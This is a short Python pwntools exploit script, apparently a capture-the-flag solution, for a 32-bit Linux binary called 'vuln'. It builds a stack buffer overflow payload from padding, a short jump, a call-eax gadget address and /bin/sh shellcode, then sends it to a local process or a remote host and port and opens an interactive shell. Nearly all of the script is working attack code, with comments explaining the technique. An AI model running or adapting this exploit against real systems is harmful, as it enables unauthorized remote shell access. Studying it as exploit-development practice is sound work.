#!/bin/python3

import pwn
import argparse

parser = argparse.ArgumentParser()

parser.add_argument('type', type=str)
parser.add_argument('--host', type=str)
parser.add_argument('--port', type=int)

args = parser.parse_args()

type = args.type
host = args.host
port = args.port

bufoffset = 24

overflow = b'A'*bufoffset

# note : \x90 is for no operation (just for filling the buffer)
shortjump = b'\xeb\x04\x90\x90'

callEaxAddr = pwn.p32(0x0804901d)

shellcode = pwn.asm(pwn.shellcraft.i386.linux.sh())

# used this (no operation) for filling the stack if we don't know where does shortjump land
# (but here i know where exactly shortjump would land which is 4bytes forward so im not gonna use this)
nop = b'\x90'*16

payload = b''.join([
    overflow,  # used for overflowing allocated buffer (with over bounds)
    shortjump,  # used for 4bytes forward jump into shellcode in 2nd execution of eax without triggering newEip change
    callEaxAddr,  # used for call / jump into eax value which is the payload at
    # shellcode for getting shell because the ELF has NX disabled (which allowing me to execute shellcode to it)
    shellcode
])

p = None

with open('payload', 'wb') as pl:
    pl.write(payload)

if type == 'local':
    p = pwn.process('./vuln')
elif type == 'remote':
    p = pwn.remote(host, port)
else:
    print('Please provide local or remote to type parameter')
    exit()

p.sendline(payload)

p.interactive()
p.close()
